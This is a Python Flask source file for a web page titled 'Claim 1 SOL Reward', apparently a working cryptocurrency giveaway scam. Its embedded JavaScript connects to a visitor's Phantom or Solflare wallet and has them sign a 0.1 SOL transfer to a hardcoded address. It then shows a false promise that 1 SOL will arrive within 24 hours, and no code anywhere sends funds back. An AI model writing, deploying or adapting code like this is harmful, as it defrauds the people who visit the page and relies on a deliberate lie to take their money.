from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Claim 1 SOL</title>
<style>
  body {
    background-color: #000;
    color: white;
    font-family: sans-serif;
    text-align: center;
    padding: 40px;
  }
  img.qr {
    width: 220px;
    margin: 20px auto;
    border-radius: 16px;
    box-shadow: 0 0 20px #00ff90;
    display: none;
  }
  .wallet-button, .claim-button {
    background: linear-gradient(90deg, #00ff90, #00d178);
    border: none;
    padding: 14px 30px;
    font-size: 1.2em;
    margin: 15px;
    border-radius: 30px;
    cursor: pointer;
    color: #000;
    font-weight: bold;
  }
  #walletStatus {
    margin-top: 20px;
    font-weight: bold;
  }
</style>
<script type="module">
  import {
    Connection,
    PublicKey,
    SystemProgram,
    Transaction
  } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

  let provider = null;

  function updateStatus(text) {
    document.getElementById("walletStatus").innerText = text;
  }

  async function detectProviderWithPolling(timeoutMs = 10000, intervalMs = 500) {
    const start = Date.now();
    return new Promise((resolve) => {
      const check = () => {
        if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
          console.log("Wallet provider detected:", window.solana);
          resolve(window.solana);
        } else if (Date.now() - start > timeoutMs) {
          console.log("Wallet provider NOT detected after timeout");
          resolve(null);
        } else {
          setTimeout(check, intervalMs);
        }
      };
      check();
    });
  }

  async function connectWallet() {
    console.log("Connecting wallet...");
    updateStatus("Detecting wallet provider...");
    provider = await detectProviderWithPolling();

    if (!provider) {
      updateStatus("No wallet detected. Please open Solflare or Phantom app and open this site inside its browser.");
      document.getElementById("qrCode").style.display = "block";
      document.getElementById("connectWalletBtn").disabled = false;
      document.getElementById("claimBtn").disabled = true;
      return;
    }

    if (provider.isConnected) {
      console.log("Wallet already connected:", provider.publicKey.toString());
      updateStatus("Wallet already connected: " + provider.publicKey.toString());
      document.getElementById("connectWalletBtn").disabled = true;
      document.getElementById("claimBtn").disabled = false;
      return;
    }

    provider.on("connect", () => {
      console.log("Wallet connected event:", provider.publicKey.toString());
      updateStatus("Wallet Connected: " + provider.publicKey.toString());
      document.getElementById("connectWalletBtn").disabled = true;
      document.getElementById("claimBtn").disabled = false;
    });

    try {
      console.log("Calling provider.connect()...");
      await provider.connect();
      console.log("provider.connect() resolved");
    } catch (err) {
      console.error("Wallet connection failed:", err);
      updateStatus("Wallet connection failed: " + err.message);
      document.getElementById("connectWalletBtn").disabled = false;
      document.getElementById("claimBtn").disabled = true;
    }
  }

  async function sendTransaction() {
    if (!provider || !provider.publicKey) {
      alert("Please connect your wallet first.");
      return;
    }

    updateStatus("Sending transaction...");

    const connection = new Connection("https://api.mainnet-beta.solana.com");

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: new PublicKey("{{ wallet }}"),
        lamports: 0.1 * 1e9 // 0.1 SOL in lamports
      })
    );

    try {
      const signedTx = await provider.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signedTx.serialize());
      await connection.confirmTransaction(signature);
      alert("✅ Transaction sent! You paid 0.1 SOL and will receive 1 SOL within 24 hours.");
      updateStatus("Transaction confirmed: " + signature);
    } catch (e) {
      console.error(e);
      alert("❌ Transaction failed: " + e.message);
      updateStatus("Transaction failed");
    }
  }

  window.connectWallet = connectWallet;
  window.sendTransaction = sendTransaction;
</script>
</head>
<body>
  <h1>Claim 1 SOL Reward</h1>
  <p>Send exactly <b>0.1 SOL</b> to this wallet address:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
  <p id="walletStatus">Click "Connect Wallet" to begin</p>
  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button">Connect Wallet</button>
  <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
